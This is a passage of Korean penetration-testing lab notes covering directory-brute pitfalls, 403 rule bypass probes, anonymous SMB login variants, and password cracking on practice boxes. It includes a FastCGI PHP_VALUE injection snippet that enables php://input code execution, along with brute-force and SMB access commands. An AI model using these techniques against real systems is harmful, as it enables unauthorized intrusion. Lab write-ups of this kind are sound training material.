**증상 둘** — ⓐ 워드리스트를 돌리기도 전에 gobuster 가 스스로 멈춤 ⓑ 확장자 조합만 바꿔 여러 번 돌리는데 200 목록이 매번 똑같음.

**ⓐ 와일드카드 감지로 스캔이 즉시 중단됨.**
```text
the server returns a status code that matches the provided options for non existing urls => 301
```
[[Exfiltrated]] — Subrion CMS 의 `.htaccess` 가 존재하지 않는 경로를 전부 라우터로 넘겨 항상 301 을 줌. gobuster 의 와일드카드 감지기가 이걸 보고 시작하자마자 멈춤. **메시지를 읽지 않고 다른 도구(feroxbuster 등)로 갈아타는 것이 최악의 대응** — front controller 형 CMS(Subrion·Laravel·Symfony·WordPress permalink) 공통 증상이라 같은 벽에 다시 부딪힘.
우회는 둘 — **트레일링 슬래시 모드 `-f`**(Subrion 의 rewrite 규칙이 `/foo`→`/foo/` 정규화 301 을 먼저 던지므로, 처음부터 슬래시를 붙이면 그 단계를 건너뛰고 라우터의 최종 판정을 직접 받음), 또는 파일 모드에 **`-b 404,301`**.
→ **모든 응답이 301 이면 정규화 리다이렉트를 밟고 있다는 신호로 읽을 것.** 와일드카드 응답 자체가 「이 앱은 front controller 형이다」라는 식별 정보임.

**ⓑ 확장자가 URL 의 장식일 뿐임.**
```text
/panel.php   200  6155
/panel.txt   200  6155
/panel.bak   200  6155
/panel.zip   200  6155
/panel.phar  200  6155
```
— 출처: `~/PG/Exfiltrated/gobuster_files.txt`. 라우터가 확장자를 무시하고 라우트 이름만 매칭하므로 **바이트 단위로 동일한 응답**이 나옴. 서로 다른 파일이 우연히 같은 크기일 확률은 사실상 0이라 **이것을 「`.bak`/`.zip` 백업 유출」로 오독하면 시간을 통째로 버림**(다운로드 → `file` → HTML → binwalk·foremost 순으로 30분). `-x php,txt,bak,zip` 확장자 스윕은 **정적 파일 서버를 전제한 기법**이라 이런 앱에서는 히트 수만 폭증하고 정보량이 0임.
→ **여러 확장자가 같은 크기로 히트하면 다운로드 전에 `curl -sI` 로 `Content-Type`, `curl -s | head` 로 본문 첫 줄을 볼 것.** 5초면 판정됨.

**같은 증상의 .NET 판 — 라우트지 파일이 아님.** [[Nagoya]] 실측: feroxbuster 를 `php,html,txt,bak,zip` → `html,txt,php` → `html,txt,asp,aspx` 순으로 **3회**(13:25/13:32/13:35, 약 10분) 돌렸으나 state 파일상 **세 번 모두 200 응답은 똑같은 12개**. 세 번째만 응답 총계 913 중 **901 이 503** — 새 경로를 찾은 것이 아니라 `.asp/.aspx` 를 퍼붓다 IIS 가 뻗은 것. 세 state 전부 scan status 가 `Running` 이라 **완주한 실행은 하나도 없음**(전부 손으로 끊음).
판정 근거 둘이 같은 결론을 가리켰음 — `/Nagoya.styles.css`(ASP.NET Core CSS isolation 산출물 `<어셈블리명>.styles.css`) · `/index`·`/team`·`/error` 가 **확장자 없이 200**(MVC 라우팅).
→ **정적 자산 외 페이지는 첫 스캔에서 이미 다 나옴.** `/team` 을 처음 봤을 때 멈췄어야 했음.

**라우터가 전부 삼키는 앱에서 «실제 디렉터리»를 찾는 법 — 서버가 앱보다 먼저 처리하는 경로를 프로브할 것.** `.htaccess`·`.ht*` 는 Apache 배포 기본 설정(`Require all denied`)에서 **mod_rewrite 보다 먼저** 차단되므로 응답 «크기»가 디스크 실존을 알려줌:
```text
/uploads/.htaccess          403  283      ← Apache 자체 403 = 디스크에 실존
/tmp/.htaccess              403  283      ← 실존
/includes/.htaccess         403  283      ← 실존
/backup/.htaccess           403  283      ← 실존
/uploads/shared/.htaccess   404  17510    ← 앱이 렌더한 404 = 없음
```
[[Exfiltrated]] 는 이 기법으로 `/uploads/` 가 실존하는 업로드 저장 경로임을 **업로드 전에** 확정했음. 같은 발상의 다른 프로브 — `.git/HEAD`·디렉터리 인덱스. **판별 기준은 상태 코드가 아니라 응답 크기·헤더 세트임**(A-12).

#### A-1-24. 정찰 페이지가 방금 «내가 보낸 값»을 되비친다

**php-fpm·CGI·`LD_PRELOAD`·환경변수 주입처럼 런타임 설정을 바꾸는 공격을 이미 던진 상태라면, 그 뒤에 읽은 `phpinfo()`·`/server-status`·`env` 출력은 1차 사료가 아님.**

[[PlanetExpress]] — FastCGI(9000)로 `PHP_VALUE`/`PHP_ADMIN_VALUE` 주입 요청을 먼저 보낸 뒤(16:04~16:05), 같은 fpm 워커에 Apache 경유로 도달한 phpinfo() 페이지(16:06~16:07)가 그 값들을 Local/Master 양쪽으로 그대로 보여줌:
```python
'PHP_VALUE'      : 'allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'extension_dir = /tmp\ndisable_functions = ',
```
그 페이지의 `SERVER_SOFTWARE` 가 `Apache/2.4.38 (Debian)` 이라 내 클라이언트가 만든 응답이 아니었음(`fcgi.py` 는 `php/fcgiclient` 로 보냄). 세 값은 배포판 기본값이 아니고 `disable_functions=no value` 는 root 로 읽은 `php.ini:310` 의 긴 블랙리스트와 **정면으로 어긋남.** `[가정]` 정확한 지속 조건(요청 단위여야 할 값이 왜 다음 요청까지 살아남았는가)은 **관측 없음 — 박스 정지로 재수집 불가**.

**증상이 조용한 것이 이 함정의 본체임.** `system()` 은 계속 막혀 있었으니 `disable_functions=no value` 만 믿었으면 「왜 막혔지」로 헤맸을 것(실제로 잠깐 그랬음). 살려준 것은 phpinfo 재확인이 아니라 **`function_exists` 전수조사**였음(B-13).

→ **순서를 지킬 것 — 정찰 페이지는 아무것도 주입하기 전에 먼저 저장해 두고, 이후 판본은 diff 로만 믿을 것.**
→ 그게 안 됐으면 판별법은 하나임 — **그 값이 내가 보낸 값과 글자까지 같은가.** 같으면 내 것임.
→ 「자동 도구가 뱉은 값이 의심스럽다」(A-11)의 짝 — 저쪽은 **도구의 오탐**, 이쪽은 **내가 만든 오염**임.

**출처** — [[PlanetExpress]](`~/PG/PlanetExpress/try1_fcgi_index.log` · `picotest_out.html` · `root_enum_fw.log` 의 `php.ini:310`).

#### A-1-25. Windows 타겟과 Kali 는 대소문자 규칙이 반대다 — 양방향으로 사고가 남

**⑴ 타겟 쪽 — 대소문자 변형 히트를 셋으로 세지 말 것.** feroxbuster 출력에 `/dev`·`/DEV`·`/Dev` 가 셋 다 301 로 찍힘. Windows/IIS 파일시스템은 대소문자를 구분하지 않으므로 **하나의 디렉터리임.** 셋을 각각 재귀 스캔하면 같은 일을 3배로 함 — [[Butch]] 는 출력 하단에 `Directory listing` 알림이 **세 번** 찍힌 것이 그 증거였음.
→ 반대로 이 성질은 무기이기도 함 — 업로드 필터가 `.aspx` 만 소문자로 블랙리스트했다면 `.AspX` 가 통과한 뒤 정상 실행됨(B-1-42).

**⑵ 공격 머신 쪽 — 같은 세션에서 반대 규칙에 걸림.** [[Butch]] 실측: 타겟의 `/dev`≡`/Dev` 를 다루다 온 직후 박스 작업 디렉터리를 소문자로 침. 리눅스는 대소문자를 구분하므로 `~/PG/butch` 가 **디렉터리가 아니라 파일로** 새로 만들어짐(`cp SRC DST` 에서 DST 가 없으면 파일 취급):
```sh
cp nc64.exe ~/PG/butch    # ← ~/PG/butch 라는 «파일» 이 생김
cp nc64.exe ~/PG/Butch    # ← 정정
rm butch                  # ← 잘못 생긴 파일 제거
```
— 출처: Kali `~/.zsh_history:2314`–`:2318`. 현재 `~/PG/` 에 `butch` 없음(정리 확인).
→ **타겟과 공격 머신의 대소문자 규칙이 반대라는 것을 의식할 것.** 환경 오타 비용 일반론은 A-6-10.


⛔ **리다이렉트 «목적지»가 정규 표기를 알려주지 않음 — 흔한 오독임.** [[Algernon]] 실측(`~/PG/Algernon/gobuster_9998.txt`):
```text
/scripts   (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/scripts/]
/Scripts   (Status: 301) [Size: 158] [--> http://192.168.248.65:9998/Scripts/]
/services  (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/services/]
/Services  (Status: 301) [Size: 159] [--> http://192.168.248.65:9998/Services/]
```
IIS 는 **요청한 표기에 슬래시만 붙여** 돌려줌 — 어느 쪽이 디스크상의 이름인지는 이 출력만으로 알 수 없음. 그 노트는 한때 「`/scripts` 가 `/Scripts/` 로 리다이렉트되므로 정규 표기는 `Scripts`」라고 적었는데 **산출물이 그것을 반박함**(둘 다 자기 표기로 리다이렉트됨).
→ 대소문자 중복은 **「하나의 리소스」라는 것까지만** 결론 낼 것. 정규 표기가 필요하면 셸을 잡은 뒤 `dir` 로 볼 것.

#### A-1-26. 브루트 결과의 `400`·예약 장치명·제어문자는 발견이 아니다

**증상** — feroxbuster 출력에 `/con`·`/aux`·`/prn` 404(본문 1888c)와 `error%1F_log` 계열 400 이 잔뜩 찍힘. 숨겨진 로그 파일로 읽고 파고들면 시간이 사라짐.

**원인 둘**
- `CON`·`PRN`·`AUX`·`NUL`·`COM1~9`·`LPT1~9` 는 **DOS 예약 장치명**이라 Windows 에서 파일명이 될 수 없어 IIS 가 특수 처리함. 실재 경로가 아님
- `%1F` 는 제어문자(Unit Separator). IIS 의 `http.sys` 가 URL 의 제어문자를 애플리케이션에 닿기 «전»에 거절함. **워드리스트 오염임**

**판별 기준** — **`400` 은 「서버가 요청 «형식»을 거부」이지 「리소스가 있다」가 아님.** 추격 대상은 `200`·`301/302`·`403` 뿐이고 그중 **`403` 이 특히 값짐**(있는데 못 본다는 뜻).

**출처** — [[Butch]]. 응답 «크기»로 노이즈를 접는 쪽은 A-1-13.


**IIS/ASP.NET 판은 `404` 가 아니라 `302` 로 나옴 — 그래서 더 잘 속음.** [[Algernon]] `gobuster_9998.txt` 에서 예약 장치명 여덟 개(`aux`·`con`·`prn`·`nul`·`com1~3`·`lpt1~2`)가 전부 **302 + Size 162~163** 으로 찍혔음:
```text
/aux   (Status: 302) [Size: 162] [--> /Interface/errors/404.html?aspxerrorpath=/aux]
/com1  (Status: 302) [Size: 163] [--> /Interface/errors/404.html?aspxerrorpath=/com1]
```
→ **판별은 상태 코드가 아니라 리다이렉트 «목적지»로 함.** 전부 `/Interface/errors/404.html?aspxerrorpath=…` — 404 를 302 로 포장한 것임. 「200/301/302 라는 코드」가 아니라 「본문·목적지가 다른가」로 볼 것(A-12 의 열거 판).

#### A-1-27. nmap 의 `Did not follow redirect to …` 는 진입 URL 을 통째로 알려준다

**증상** — 웹 포트를 열었더니 404 뿐이라 「빈 서버」로 접게 됨. 그런데 정답 경로는 그 포트에 있음.

`http-title` NSE 는 리다이렉트를 **따라가지 않고 목적지 URL 을 제목 자리에 그대로 출력**함. 이 문자열이 보이면 반드시 그 URL 을 직접 열 것.

[[Pelican]] 실측 — 8080 단독으로는 판정이 불가능했음:
```text
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.115.98:8080/exhibitor/v1/ui/index.html
```
8081 의 한 줄이 **제품명(`exhibitor`)과 정확한 경로를 동시에** 줬음. 워드리스트로는 `/exhibitor/v1/ui/index.html` 같은 깊은 경로를 못 찾음.

리다이렉트 목적지에 흔히 들어 있는 것 셋 — **깊은 경로**(디렉터리 열거로는 못 찾음) · **호스트명/도메인**(`/etc/hosts` 에 등록해야 하는 vhost) · **다른 포트**(이 박스처럼 8081 → 8080).

→ **404 를 만나면 루트가 아니라 «경로»를 찾을 것.** 같은 IP 의 다른 포트가 알려준 리다이렉트 목적지부터 확인:
```bash
curl -sI http://TARGET:8081/
curl -s  http://TARGET:8080/<리다이렉트가 알려준 경로> | head
```
⚠️ 반대로 **문서 사이트가 나오면 거기서 접을 것**(A-16) — 이 카드는 「404 를 오판하지 마라」이지 「모든 웹 포트를 끝까지 파라」가 아님.

#### A-1-28. 403 이 «파일·확장자 단위»로 걸린다 — 규칙이 무엇을 «빠뜨렸는지»를 찾는다

**증상** — 같은 디렉터리 안에서 어떤 파일은 403, 어떤 파일은 200 임. 차단이 경로 단위가 아니라 **파일·확장자 단위**로 걸려 있음.

**404 와 403 은 다른 신호임.**
- **404** = 그 경로에 아무것도 없음 → 다른 경로를 찾을 것
- **403** = 뭔가 있는데 규칙이 막고 있음 → **규칙의 구멍**을 찾을 것

스캐너는 403 을 「실패」로 표시하고 넘어감. ffuf 에 `-mc all` 또는 최소한 `-mc 200,301,302,403` 을 주는 이유임.

**차단 기준 셋을 시험할 것:**
```bash
# 1. 확장자 기준인가
curl -o/dev/null -w'%{http_code}\n' TARGET/path/file.php
curl -o/dev/null -w'%{http_code}\n' TARGET/path/file.json
# 2. 경로 기준인가 (대소문자·트래버설로 정규화 차이 유발)
curl -o/dev/null -w'%{http_code}\n' TARGET/Vendor/composer/installed.php
curl -o/dev/null -w'%{http_code}\n' TARGET/./vendor/composer/installed.php
# 3. 메서드·헤더 기준인가
curl -o/dev/null -w'%{http_code}\n' -X HEAD TARGET/path/file.php
```

**상습 누락 확장자** — `.json` · `.lock` · `.map` · `.bak` · `.dist` · `.orig` · `.swp` · `.example`.

[[Astronaut]] 실측 — Grav 코어 1.7.8 의 `.htaccess` 가 `system/`·`vendor/` 하위를 **확장자 화이트리스트**로 막음:
```apache
^(system|vendor)/(.*)\.(txt|xml|md|html|yaml|yml|php|pl|py|cgi|twig|sh|bat)$
```
`json` 이 없음. 그래서 같은 디렉터리에서 `installed.php` 는 403 인데 `vendor/composer/installed.json` 은 **200, 126903바이트**로 그대로 받아졌고 **51개 의존 패키지의 버전 + git commit reference** 가 통째로 샜음 — 그것이 코어 버전 판정 근거가 됐음(A-13).
— 출처: `~/PG/Astronaut/installed.json`(파일 크기 126903B 로 응답 크기와 일치)

⚠️ **화이트리스트·블랙리스트 방식의 접근 제어는 누락이 생기기 마련임.** 403 이 나오면 접지 말고 **같은 파일의 다른 확장자, 같은 디렉터리의 다른 파일**을 찔러볼 것.

#### A-1-29. 공개 PoC 가 python2 전용이다 — 최신 Kali 에는 python2 가 없다

Kali 는 2021년경부터 python2 를 기본 제외했음. `python2: command not found` 가 나오면 셋 중 하나임:
1. **py3 포크를 찾음** — [[Kevin]] 의 HP Power Manager 익스플로잇에는 `CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3`(리버스셸 방식)가 있었음
2. `sudo apt install python2` — 저장소에 남아 있으면
3. **직접 포팅** — 핵심은 셋뿐임

| 문법 | py2 | py3 에서 어떻게 되나 |
|---|---|---|
| `print "%s" % x` 같은 print 문 | 구문 | `SyntaxError` |
| `urllib.quote_plus` | `urllib` 모듈 직속 | `urllib.parse.quote_plus` 로 이동 |
| `str` = `bytes` | `"\x41"*689 + shellcode` 를 그대로 `s.send()` | `str` 과 `bytes` 가 분리 → 전부 `bytes` 로 만들고 `.encode('latin-1')` 처리 필요 |

**세 번째가 가장 성가심.** py3 에서는 `"\x41"` 이 유니코드 문자열이라 **`\x80` 이상 바이트가 UTF-8 로 2바이트가 되어 페이로드가 조용히 망가짐.**
⚠️ **`latin-1` 이 핵심임** — 0x00~0xFF 를 1:1 로 매핑하는 유일한 인코딩이라 바이트가 변형되지 않음. `utf-8` 을 쓰면 망가짐.

#### A-1-30. 익명 SMB 는 표기가 넷임 — 하나만 쳐보고 배제하지 말 것

**증상** — `smbclient -L <IP> -N` 하나만 쳐보고 실패해 익명 경로를 통째로 배제함.

**서버마다 「익명」을 받는 계정 이름이 다름.** 최소 넷을 다 던질 것:
```bash
smbclient //IP/share -N            # null 세션
smbclient //IP/share -U ''         # 빈 사용자
smbclient //IP/share -U 'guest'
smbclient //IP/share -U 'anonymous'
smbmap -H IP -u anonymous          # -u '' -p '' · -u guest 도
nxc smb IP -u '' -p '' --shares    # -u guest -p '' 도
```

| 표기 | 실제 인증 | 서버가 보는 것 |
|---|---|---|
| null 세션(`-N`) | 사용자명·비밀번호 둘 다 빈 문자열 | `ANONYMOUS LOGON`(S-1-5-7) |
| 빈 사용자(`-U ''`) | 사용자명 빈 문자열 | 대개 null 세션과 같게 처리 |
| `guest` | `Guest` 계정(활성화돼 있으면) | `<도메인>\Guest` |
| `anonymous` | 문자 그대로 그런 이름의 사용자 | 계정이 없으면 실패, Guest 로 매핑되기도 |

⛔ **B-55 ⑷ 의 「널 세션은 한 번만 확인하고 넘어갈 것」과 대상이 다름 — 모순이 아님.**
- **사용자·도메인 «열거»**(`--users`·`--rid-brute`) — 현대 Windows 는 기본 차단이라 **한 번 확인하고 넘어갈 것**
- **공유 «접근»** — 공유별 ACL 이 `Everyone`·`ANONYMOUS LOGON` 에 열려 있으면 익명 읽기·쓰기가 그대로 성립함. **여기가 네 표기를 다 던져볼 자리임**(B-57)

구형 Windows(2000·2003)는 null 세션에 사용자 목록·그룹·비밀번호 정책까지 열어줬음(`RestrictAnonymous=0`).

[[Vault]] 실측 — `~/.zsh_history` 에 익명 표기 시도가 **13줄** 남아 있고 통한 것은 **`-N` 과 `-U ''` 둘뿐**임. 나머지는 헛발질처럼 보이나 필요한 확인이었음.

⚠️ **`smbclient -L <IP>/<공유>` 는 문법이 틀림** — `-L`(공유 나열)은 호스트만 받음. [[Vault]] 히스토리에 `smbclient -L 192.168.120.172/DocumentsShare` 계열이 **5회** 있음. 공유에 들어갈 때는 `-L` 없이 `smbclient //IP/공유`.
⚠️ **`smbmap` 의 `WRITE` 표기를 믿되 한 번은 실제로 올려볼 것** — 공유 권한이 WRITE 인데 NTFS 권한이 READ 면 실패함. [[Vault]] 는 5바이트 `test.txt` 를 실제로 `put` 해 확정했음.

#### A-1-31. `Microsoft-HTTPAPI` 배너가 뜨는 포트에 디렉터리 브루트는 헛수고다

**증상** — `5985`·`47001` 처럼 `Microsoft-HTTPAPI/2.0` 배너가 뜨는 포트에 `feroxbuster`/`gobuster` 를 돌렸는데 아무것도 안 나옴.

`Microsoft-HTTPAPI/2.0` 는 **WinRM(WSMan)의 HTTP 리스너**지 콘텐츠가 있는 웹 애플리케이션이 아님. 같은 nmap 출력의 `http-title: Not Found` 가 이미 그 신호임.
```text
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
— 출처: `~/PG/Osaka/nmap.log`

[[Osaka]] 실측 — `~/.zsh_history` 2148·2149행에 47001 대상 `feroxbuster` 가 두 번(첫 줄은 URL 이 깨져 즉시 실패, 재시도는 정상 실행) 남아 있고, **2744행에는 «다른 박스»(`192.168.104.111:47001`)에 같은 반사를 또 쓴 흔적**이 있음 — 한 번의 실수가 아니라 굳어진 반사임.
→ **디렉터리 브루트를 돌리기 전에 배너로 「콘텐츠가 있는 웹서버인지」부터 가를 것.** `Microsoft-HTTPAPI`·`WinRM` 이면 그 포트의 승부처는 열거가 아니라 **자격증명**임(자격증명이 나오면 `evil-winrm`, F-1).
→ 부수 — 같은 세션에 `smbclient -L //192.168.243.20 -N`(2201·2643행)도 남아 있으나 **결과가 산출물에 없어 성공·실패 확정 불가.** 445 가 열려 있으면 익명 SMB 를 습관적으로 쳐볼 것이되(A-1-30), **출력을 파일로 남기지 않으면 나중에 재구성이 안 됨** — 이 교훈 자체가 그 사례임.

#### A-1-32. Apache 루트 403 을 「막혔다」로 읽지 않는다

**Apache 루트의 403 은 대개 「`DirectoryIndex` 에 맞는 파일이 없고 `Options -Indexes` 인 상태」임** — 하위 경로는 멀쩡히 살아 있을 수 있음. 404 와 403 의 구분(A-1-28)이 **루트에도 그대로** 적용됨.
```bash
feroxbuster -u http://<타겟>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html
```
[[Clue]] — 포트 80(Apache 2.4.38, 루트 403)의 디렉터리 열거를 한 기록이 **없음.** 3000(Cassandra Web)이 먼저 뚫려 결과적으로 손해는 없었으나, **3000 이 막혔다면 80 이 다음 후보였고 준비가 안 돼 있었음.**
→ **「다음 후보를 준비해 두는 것」이 정찰의 절반임.** 첫 벡터가 통했다고 해서 두 번째 포트를 안 판 것이 정당화되지는 않음 — 시험에서는 첫 벡터가 막히는 쪽이 정상임.

#### A-1-33. Kali `pip install` 이 거부된다 — PEP 668

**증상** — `pip install <pkg>` 가 `error: externally-managed-environment` 로 거부됨. Kali 는 시스템 파이썬을 apt 가 관리하므로 PEP 668 마커 파일이 깔려 있음:
```text
[externally-managed]
Error=To install Python packages system-wide, try apt install
 python3-xyz, where xyz is the package you are trying to
 install.

 If you wish to install a non-Kali-packaged Python package,
 create a virtual environment using python3 -m venv path/to/venv.
 Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
 sure you have pypy3-venv installed.
```
— 출처: `/usr/lib/python3.13/EXTERNALLY-MANAGED`(2026-08-26 재확인. 파이썬 마이너 버전이 오르면 경로도 함께 바뀜)

| 방법 | 명령 | 언제 |
|---|---|---|
| apt 패키지 | `sudo apt install python3-<pkg>` | 1순위. 있으면 가장 깨끗 |
| 잠금 해제 | `pip install <pkg> --break-system-packages` | **가장 빠름. 랩·시험 기본** |
| venv | `python3 -m venv v && ./v/bin/pip install <pkg>` | 시스템을 안 더럽히고 싶을 때 |

[[Clue]] 실측 — `smbprotocol` 설치에 **6줄**을 태웠음(`~/.zsh_history` 1051~1056행):
```text
pip install smbprotocol
python pip -m smbprotocol
python pip smbprotocol
pip -m smbprotocol
python -m pip install smbprotocol
python -m pip install smbprotocol --break-system-packages   ← 성공
```
2~4행은 **존재하지 않는 호출 형태**(`python pip`·`pip -m`)라 PEP 668 과 무관한 문법 오류였고, 실제 거부는 1·5행 둘뿐임 — **거부 메시지를 읽지 않고 호출 형태를 바꿔 가며 찍은 것**이 손실의 정체임. 같은 계열: A-1-29(python2 부재).
→ **에러 메시지가 해법을 그대로 적어 주는 경우가 많음.** 형태를 바꿔 재시도하기 전에 **출력 3줄을 읽을 것.**

### A-2. 진입 (foothold)

#### A-21. 웹 진입점에서 더 나갈 곳이 없다

- **손절 전에 `web-exploit` 전문에 넘길 것.** 일반 러너가 웹 벡터(SQLi·LFI·인증우회)를 배제했어도, **대중적 난이도인데 온라인 브루트가 정답처럼 보이면 그건 우리가 못 본 웹 취약점의 신호임.** [[Wheels]] 는 손절 직전 재투입으로 뚫림(XPath injection)
- **디렉터리 버스팅이 비면 «이미 아는 이름»을 넣어 볼 것.** SMB 공유명·호스트명·앱 이름이 그대로 경로인 경우가 있음
- **저장소 이원화를 의심할 것** — A-22 참조

**권한 게이트를 「역할·is_admin 컬럼」으로 단정하지 말 것.** [[Wheels]] 에서 register 의 role/is_admin 등 약 35개 mass-assignment, 쿠키·XFF·배열우회·ffifdyop·사용자명 충돌, login/register 전 필드 SQLi(time+boolean+2차)를 **전부** 시도했으나 아님. 실제 게이트는 **가입 이메일 도메인 `@wheels.service`** 였음.
- 정찰 시작 02:32 → XPath 벡터 착수(`xpath.py`) 03:59 = **약 90분을 게이트 오판에 태움**(`~/PG/Wheels/` mtime 재구성)
- 03:43 시점 `writeup_notes.txt` 가 `BLOCK: … No shell. 0/2 flags` 로 **손절 직전**이었고, 거기 「gate uses role/is_admin captured at login」이라는 **틀린 가설**이 그대로 적혀 있었음
- 도메인의 진짜 출처는 `whatweb`(`.serv` 로 오탐, A-11)이 아니라 **페이지 푸터 `info@wheels.service`** — `login_resp.html`·`reg_resp.html` 에 **이미 손에 있었음**

**프레임워크 dev 진입점 하나가 막혔다고 전부 막힌 것이 아님.** [[Fractal]]:
- prod 경로로 프로파일러를 찾다 헛발 — `/_profiler`·`/_profiler/latest` 둘 다 **404**(`sym/_profiler.html`·`_profiler_latest.html`). 프로파일러 라우트는 `app_dev.php` **뒤에** 붙음(`app_dev.php/_profiler/...`). `app_dev.php/_configurator/` 도 `No route found` 404
- `web/config.php` 는 `This script is only accessible from localhost.` 46바이트로 막혀 있었음(`sym/config.php.html`) — Symfony 배포판의 로컬 IP 가드가 **여기엔 살아 있었음.** 같은 웹루트에서 `app_dev.php` 만 열려 있었음
- phpMyAdmin 은 **배제한 게 아니라 필요가 없었음** — `/phpmyadmin/` 이 실제 로그인 페이지를 냈고(`sym/phpmyadmin_.html`) `parameters.yml` 의 자격증명도 있었으나, 그 계정은 앱 DB(`symfony`)용이고 필요한 것은 **`proftpd` DB** 였음. RCE 셸에서 `mysql` 클라이언트로 가는 쪽이 빨라 **시도하지 않았음**(미완이지 배제 아님)

**정적 자산만 서빙되고 동적 라우트가 «균일한» 에러면 조기에 접을 것.** [[Bratarina]] — FlaskBB 80 이 `/static/css/styles.css` 는 200 으로 정상 서빙하면서 `/login`·`/register`·`/admin` 등 동적 라우트 9종이 전부 같은 6461B 404 페이지를 돌려줌. 「응답이 200/정상처럼 보인다」와 「공격 가능한 입력이 있다」는 다름([[Crane]]·[[Squid]] 와 같은 패턴). **로그인도 회원가입도 콘텐츠도 없이 주입할 입력 자체가 없으면 함정으로 확정하고 다음 벡터로.**

#### A-22. 비번 해시를 못 깬다 (bcrypt 등)

**「bcrypt 라 못 깬다」가 벽처럼 보여도, 그 애플리케이션이 «실제로 참조하는» 저장소가 어디인지 따로 확인할 것.**
인증 DB 와 기능이 읽는 데이터가 다를 수 있음 — [[Wheels]]: 로그인 DB 는 bcrypt 인데 포털은 **별개의 XML 평문 저장소**를 봤음. bcrypt 우회가 통째로 불필요했음.

**응답 지연 ≈0.4s/try 는 bcrypt 신호임 — 그 시점에 온라인 브루트를 접을 것.** [[Wheels]]: 로그인 응답 20연속 7.9s. hydra 원문이 **자기 손절선을 이미 출력**하고 있었음 — bob `[STATUS] 215.43 tries/min … 14342891 to do in 1109:39h`(48 tasks), admin `974.43 tries/min … 245:14h`(40 tasks). **동시성을 40→48 로 올렸는데 속도가 938→215/min 으로 «떨어진» 것**도 CPU 포화 신호로 읽힘. ⚠️ 다만 이 둘은 **동시 워커가 아니라 시각이 겹치지 않는 별개 run** 임(admin 03:05:47, bob 03:18:25 — 각 hydra 로그 헤더). 통제된 비교가 아니므로 **「신호」이지 직접 증거가 아님** `[가정]`. 출처 `~/PG/Wheels/hydra_bob.full.txt`·`hydra_admin.full.txt`.
실제 정답은 크랙이 아니라 **XML 평문 읽기**였고, 비번 `Iamrockinginmyroom1212`(문장형)이라 워드리스트 밖이었던 것도 당연했음.

**대중적 난이도인데 브루트포스가 정답처럼 보이면 우리가 못 본 벡터의 신호임.** [[GLPI]]: cost 10 bcrypt + rockyou 1400만 워드는 Fundamental 난이도에 안 맞음(`john betty.hash --wordlist=rockyou --format=bcrypt`, 안 깨짐). 실제 평문은 **헬프데스크 티켓 본문**에 있었음(B-62). 인계 시점에 이미 rockyou 를 돌린 채 그 앞에서 대기하다 멈춰 있었고, 경과 시간은 기록에 없음 [관측 없음].

**해시가 아닌 곳부터 뒤질 것 — 단, 「암호화 저장소」가 항상 있는 것은 아님.** [[GLPI]] 에서 인계 문서가 「가장 유망」으로 본 경로(GLPI 가 LDAP 바인드·메일수집기 비번을 `glpicrypt.key` 로 대칭 암호화해 저장)는 **반증됨** — 키(`/var/www/glpi/config/glpicrypt.key`)는 www-data 로 읽혔으나 **복호화할 암호문 자체가 없었음.** `glpi_authldaps.rootdn_passwd`·`glpi_mailcollectors.passwd`·`glpi_configs` 의 `smtp_passwd`/`proxy_passwd` 전부 빈 값.

**크래킹은 던져놓고 넘어갈 것.** john·hydra 는 tmux 에 넣고 **즉시** 다음 벡터로. 결과는 필요해진 시점에 파일 한 번 읽으면 됨.
⛔ 폴링 루프(`until grep ...; do sleep 15; done`)를 만들어 그 앞에 앉지 말 것. 실측(2026-08-21 GLPI): 모니터 세션을 둘이나 만들어 15초마다 들여다보다 대기 상태로 턴을 끝냈고, 크래킹은 이미 끝나 있었음.

**`john` 은 `--session=<이름>` 을 «항상» 줄 것 — 안 주면 두 번째 job 이 시작조차 못 함.**
증상은 로드까지는 하고 `Crash recovery file is locked: /home/kali/.john/john.rec` 로 즉사하는 것. 세션 이름을 안 주면 `$HOME/.john/john.rec` 하나를 공유하므로, **앞서 띄운 이름 없는 job 이 아직 돌고 있으면 새 job 이 그 락에 걸림.**
[[Graph]] 실측 — 1차 john(3해시, 14:53:26 시작)이 **2시간 31분 54초** 돌아 17:25 에 끝났고, 그 사이 15:06 에 띄운 root 해시 크랙이 이 락에 걸려 죽음. **「다른 박스의 job 과 충돌」이 아니라 같은 박스의 자기 job** 이었음(`john.out` 의 `1g 0:02:31:54 DONE (2026-08-21 17:25)`).
```text
john --session=graphroot --pot=root.pot --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt root_hash.txt
```
— 출처: `~/PG/Graph/graphroot.log` 의 `Command line:` 줄. `--pot=` 도 분리하면 pot 오염이 없음.
손실 자체는 작았음(`root_hash.txt` 15:05:47 → 실패 15:06:02 → 재실행 완료 15:07:33, **1분 30초 안에 회복**) — 교훈은 시간이 아니라 습관 쪽임.
⚠️ 파생 — **「던져놓고 넘어간다」가 여기서도 맞았음.** jane 이 3초 만에 떨어진 뒤(rockyou 4,451번째 줄) 바로 SSH 로 넘어갔고 박스는 15:11 에 정리가 끝났음. john 이 완주한 것은 그로부터 **2시간 뒤**임.

#### A-23. 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다

**30만 건 완주하고 0건** — 다른 채널(백업·캡처·로그)에서 얻어야 함. ([[Exghost]])

**워드리스트 브루트는 「유저 열거가 된다」를 근거로 삼지 마라.** [[Cobbles]] — 유저 `sam` 이 열거된다는 이유로 웹 로그인 브루트에 매달려 hydra→ffuf(100스레드) rockyou 로 **2.13M/14.3M 시도, 히트 0**. 유저 열거가 된다고 브루트 박스가 아님 — **rockyou 앞 수만 개에 안 나오면 그 시점이 방향 전환점.**

**워드리스트는 «과거에 수집된 이름들의 목록»이지 대상 서버의 파일 목록이 아님.** 개발자가 즉흥적으로 지은 이름은 몇 건을 돌리든 확률이 0이고, **30만이라는 숫자는 커버리지의 착시만 줌.**
